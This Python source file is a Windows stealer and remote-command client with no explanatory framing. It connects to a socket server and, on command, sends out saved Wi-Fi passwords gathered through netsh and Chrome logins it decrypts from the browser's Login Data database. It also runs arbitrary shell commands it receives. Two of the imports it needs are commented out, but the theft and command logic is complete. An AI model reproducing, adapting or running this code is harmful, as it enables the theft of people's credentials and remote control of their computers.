import os
import json
import base64
import sqlite3
#import win32crypt
#from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import socket
import subprocess
import re




def fetching_encryption_key():
    local_computer_directory_path = os.path.join( os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome','User Data', 'Local State')

    with open(local_computer_directory_path, 'r', encoding='utf-8') as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def password_decryption(password, encryption_key):

    iv = password[3:15]
    password = password[15:]

    # generate cipher
    cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

    # decrypt password
    return cipher.decrypt(password)[:-16].decode()


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('127.0.0.1', 8080))
while True:


    from_server = client.recv(4096).decode()
    if from_server == 'give':
        command_output = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True).stdout.decode()
        profile_names = (re.findall('All User Profile     : (.*)\r', command_output))
        wifi_list = []
        if len(profile_names) != 0:
            for name in profile_names:
                wifi_profile = {}
                profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profiles', name],capture_output=True).stdout.decode()
                if re.search('Security key           : Absent', profile_info):
                    continue
                else:
                    wifi_profile['ssid'] = name
                    profile_info_pass = subprocess.run(['netsh', 'wlan', 'show', 'profiles', name, 'key=clear'], capture_output=True).stdout.decode()
                    password = re.search('Key Content            : (.*)\r', profile_info_pass)
                    if password == None:
                        wifi_profile['password'] = None
                    else:
                        wifi_profile['password'] = password[1]
                    wifi_list.append(wifi_profile)
        client.send(str(len(wifi_list)).encode())
        for x in range(len(wifi_list)):
            client.send(str(wifi_list[x]).encode())
    if from_server == "pas":
        counter = 0
        key = fetching_encryption_key()
        db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local','Google', 'Chrome', 'User Data', 'default', 'Login Data')
        filename = 'ChromePasswords.db'
        shutil.copyfile(db_path, filename)

        # connecting to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()

        # 'logins' table has the data
        cursor.execute(
            'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins '
            'order by date_last_used')

        # iterate over all rows
        for row in cursor.fetchall():
            main_url = row[0]
            user_name = row[2]
            decrypted_password = password_decryption(row[3], key)


            if user_name or decrypted_password:
                main_url=main_url+'*'
                user_name = user_name + '*'
                decrypted_password = decrypted_password + '*'
                client.send(main_url.encode())
                client.send(user_name.encode())
                client.send(decrypted_password.encode())

            else:
                continue
        cursor.close()
        db.close()

    if from_server == 'cmd':
        command_cmd = client.recv(4096).decode()
        os.system(command_cmd)
    if from_server == 'exit':
        break
    else:
        client.send('I am CLIENT'.encode())
    print (from_server)

client.close()